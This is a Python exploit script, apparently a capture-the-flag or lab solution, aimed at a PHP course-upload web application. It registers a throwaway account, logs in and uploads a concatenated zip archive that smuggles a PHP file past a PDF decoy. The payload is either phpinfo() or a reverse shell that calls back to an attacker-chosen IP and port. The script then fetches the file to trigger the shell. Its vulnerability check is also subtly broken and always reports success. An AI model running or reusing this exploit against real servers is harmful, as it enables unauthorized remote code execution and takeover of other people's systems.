#!/usr/bin/env python3

import argparse
import io
import pyperclip
import random
import re
import requests
import string
import zipfile

class Exploit():
    def __init__(self, url):
        self.url = url
        self.charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

        if "http://" not in self.url:
            self.url = "http://" + self.url

    def register(self):
        if self.url.endswith("/"):
            self.url = self.url + "register.php"
        else:
            self.url = self.url + "/register.php"

        self.headers = {"Content-Type": "application/x-www-form-urlencoded"}
        self.email = "".join(random.choices(self.charset, k=20)) + "@pwned.lul"
        self.username = "".join(random.choices(self.charset, k=20))
        self.password = "hahalulpwned"
        self.first_name = "".join(random.choices(self.charset, k=10))
        self.last_name = "".join(random.choices(self.charset, k=10))

        data = {"first_name": self.first_name,
                "email": self.email,
                "password": self.password,
                "password-confirm": self.password,
                "last_name": self.last_name,
                "username": self.username,
                "role": "student"
                }

        resp = requests.post(self.url, data=data, headers=self.headers)
        if "Registration successful!" in resp.text:
            return f"[+] Registered successfully.\nAccount info:\nUsername: {self.username}\nEmail: {self.email}\nPassword: {self.password}"
        else:
            print("[!] Wasn't able to register a new account.")
            exit(1)

    def login(self):
        self.url = self.url.split("/")[0] + "//" + self.url.split("/")[2] # reset self.url to the original one
        if self.url.endswith("/"):
            self.url = self.url + "login.php"
        else:
            self.url = self.url + "/login.php"

        data = {"username": self.username, "password": self.password}
        self.session = requests.Session()
        resp = self.session.post(self.url, data=data, headers=self.headers)
        if resp.status_code == 200 and "courses.php" in resp.text:
            return "[+] Logged in successfully."
        else:
            print("[!] Wasn't able to login.")
            exit(1)

    def upload(self, cmd="<?php phpinfo(); ?>", ip="", port=0):
        self.url = self.url.split("/")[0] + "//" + self.url.split("/")[2] # reset self.url to the original one
        if self.url.endswith("/"):
            self.url = self.url + "upload.php?s_id=13"
        else:
            self.url = self.url + "/upload.php?s_id=13"

        exploit_zip = self.create_zip(cmd, ip, port)

        data = {"info": "How to be the employee of the month! - Quizz-3",
                "quizz_id": "13"
                }
        files = {"file": ("exploit.zip", exploit_zip.read(), "application/zip")}

        resp = self.session.post(self.url, data=data, files=files)
        if resp.status_code == 200 and "File uploaded successfully!" in resp.text:
            match = re.search(r"static/uploads/([a-f0-9]{32})/", resp.text)
            self.url = self.url.split("/")[0] + "//" + self.url.split("/")[2]
            file_path = self.url + "/static/uploads/" + match.group(1) + "/" + self.php_file
            return f"[+] File uploaded successfully to: {file_path}", file_path
        else:
            print("[!] Wasn't able to upload the zip file.")
            exit(1)

    def create_zip(self, cmd, ip="", port=0):
        payload = cmd
        self.php_file = "".join(random.choices(self.charset, k=30)) + ".php"

        zip1_data = io.BytesIO()
        with zipfile.ZipFile(zip1_data, "w") as zf1:
            zf1.writestr("pwned.pdf", b"%PDF-1.4 haha lul pwned")
        zip1_data.seek(0)

        if ip and port:
            with open("./shell.php", "r") as f:
                php_code = f.read()
            
            pattern = r"\$sh\s*=\s*new\s+Shell\(\s*'[^']*'\s*,\s*\d+\s*\);"
            replacement = f"$sh = new Shell('{ip}', {port});"
            php_code = re.sub(pattern, replacement, php_code) # dynamically updating the ip
            php_code = re.sub(pattern, replacement, php_code) # dynamically updating the port

            zip2_data = io.BytesIO()
            with zipfile.ZipFile(zip2_data, "w") as zf2:
                zf2.writestr(self.php_file, php_code.encode())
            zip2_data.seek(0)
        else:
            zip2_data = io.BytesIO()
            with zipfile.ZipFile(zip2_data, "w") as zf2:
                zf2.writestr(self.php_file, payload.encode())
            zip2_data.seek(0)

        exploit_zip = io.BytesIO()
        exploit_zip.write(zip1_data.read())
        exploit_zip.write(zip2_data.read())
        exploit_zip.seek(0)

        return exploit_zip

def print_info(msg=""):
    print(msg)

def get_shell(url):
    _ = requests.get(url) # trigger the shell

def main():
    parser = argparse.ArgumentParser(description="Script to obtain a reverse shell through PHP file upload via zip concatenation.")
    parser.add_argument("-u", "--url", help="Target URL. (eg. example.com)", required=True)
    parser.add_argument("-s", "--shell", help="Get a reverse shell.", required=False, action="store_const", const=True, default=False)
    parser.add_argument("-l", "--listen", help="IP to listen on.", required=False)
    parser.add_argument("-p", "--port", help="Port to listen on.", required=False)
    parser.add_argument("-v", "--verbose", help="Enable verbose mode.", required=False, action="store_const", const=True, default=False)
    args = parser.parse_args()

    try:
        if not args.shell:
            if args.listen or args.port:
                print("[!] Can't set the IP and port to listen on without setting the -s option.")
                exit(1)

            print("[*] Only checking if the target is vulnerable.")
            ex = Exploit(args.url)
            register_info = ex.register()
            if args.verbose: print_info(register_info)
            login_info = ex.login()
            if args.verbose: print_info(login_info)
            resp, url = ex.upload()
            if args.verbose: print_info(resp)
            if "Apache Environment" or "HTTP Headers Information" or "PHP Variables" or "PHP Credits" in resp:
                print("[+] Target is vulnerable.")
                pyperclip.copy(url)
                print("[*] Copied the url for phpinfo() to the clipboard if you wanna see it work for yourself :)")
            else:
                print("[+] Target isn't vulnerable.")

        if args.shell:
            if not (args.listen and args.port):
                print("\n[!] Need to set the IP and port to listen on.\n")
                print(parser.format_help())
                exit(1)
            
            print("[*] This is gonna take a second, hang tight..")
            ex = Exploit(args.url)
            register_info = ex.register()
            if args.verbose: print_info(register_info)
            login_info = ex.login()
            if args.verbose: print_info(login_info)
            upload_info, shell_url = ex.upload(ip=args.listen, port=args.port)
            if args.verbose: print_info(upload_info)
            get_shell(shell_url)
    except KeyboardInterrupt:
        print("\n[*] Exiting..")
        exit(0)

if __name__ == "__main__":
    main()